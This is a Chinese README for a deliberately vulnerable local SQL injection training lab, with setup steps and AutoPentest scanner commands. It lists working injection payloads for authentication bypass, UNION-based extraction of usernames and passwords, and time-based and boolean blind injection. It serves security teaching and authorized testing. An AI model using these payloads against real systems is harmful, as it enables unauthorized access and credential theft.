# Vulnerable Lab - SQL Injection 靶场

这是一个用于学习 SQL 注入漏洞的练习靶场环境。

## 功能特性

本靶场包含多种 SQL 注入漏洞类型：

1. **GET 参数注入** (`/api/user?id=1`)
   - 基于错误的 SQL 注入
   - 联合查询注入
   - 布尔盲注

2. **登录表单注入** (`/login`)
   - 认证绕过
   - POST 参数注入

3. **搜索功能注入** (`/api/search?q=test`)
   - LIKE 查询注入
   - 基于时间的盲注

4. **时间盲注** (`/api/posts?id=1`)
   - 基于时间的盲注
   - 响应时间分析

## 安装和运行

### 1. 安装依赖

```bash
cd vulnerable-lab
pip install -r requirements.txt
```

### 2. 启动靶场

```bash
python app.py
```

### 3. 访问靶场

在浏览器中打开: `http://localhost:5000`

## 漏洞端点说明

| 端点 | 方法 | 漏洞类型 | 测试 Payload |
|------|------|----------|--------------|
| `/api/user?id=1` | GET | 联合查询注入 | `' UNION SELECT 1,username,password,4,5 FROM user--` |
| `/login` | POST | 认证绕过 | `admin' OR '1'='1` |
| `/api/search?q=test` | GET | 搜索注入 | `test' AND SLEEP(5)--` |
| `/api/posts?id=1` | GET | 时间盲注 | `1' AND SLEEP(5)--` |

## 使用 AutoPentest 测试靶场

### 安装 AutoPentest

```bash
cd ../autopentest
pip install -r requirements.txt
```

### 测试示例

1. **测试 GET 参数注入**:
```bash
python -m autopentest.main --target http://localhost:5000 --endpoint "/api/user?id=1"
```

2. **测试常见端点**:
```bash
python -m autopentest.main --target http://localhost:5000 --test-endpoints
```

3. **生成 HTML 报告**:
```bash
python -m autopentest.main --target http://localhost:5000 --test-endpoints --report-format html --output-dir ./reports
```

## Payload 参考

### 基础测试
```
'
"
'
''
'
"
```

### 认证绕过
```
admin' OR '1'='1
admin'--
admin' #
' OR 1=1--
" OR "1"="1
```

### 联合查询注入
```
' UNION SELECT 1,2,3,4,5--
' UNION SELECT NULL,NULL,NULL,NULL,NULL--
' UNION SELECT username,password,3,4,5 FROM user--
' UNION SELECT 1,2,3,4,5 FROM user--
```

### 时间盲注
```
' AND SLEEP(5)--
1' AND SLEEP(5)--
" AND SLEEP(5)--
' AND (SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B)--
```

### 布尔盲注
```
' AND 1=1--
' AND 1=2--
' AND (SELECT COUNT(*) FROM user) > 0--
```

## 数据库结构

### User 表
- id (主键)
- username
- password
- email
- role
- is_admin

### Product 表
- id (主键)
- name
- description
- price
- category

### Post 表
- id (主键)
- title
- content
- author
- views

## 注意事项

- 本靶场仅用于学习和授权测试
- 请勿在生产环境使用
- 测试时请注意不要影响其他系统
- 建议在虚拟机或隔离环境中运行

## 扩展练习

完成基础测试后，可以尝试：

1. 提取所有用户名和密码
2. 获取管理员权限
3. 读取数据库结构信息
4. 使用自动化工具（如 AutoPentest）进行扫描
5. 编写自定义的检测脚本

## 故障排除

如果遇到问题：

1. 确保已安装所有依赖: `pip install -r requirements.txt`
2. 检查端口 5000 是否被占用
3. 查看控制台输出的错误信息
4. 删除 `vulnerable.db` 后重新启动以重置数据库

## 许可证

MIT License - 仅用于教育目的
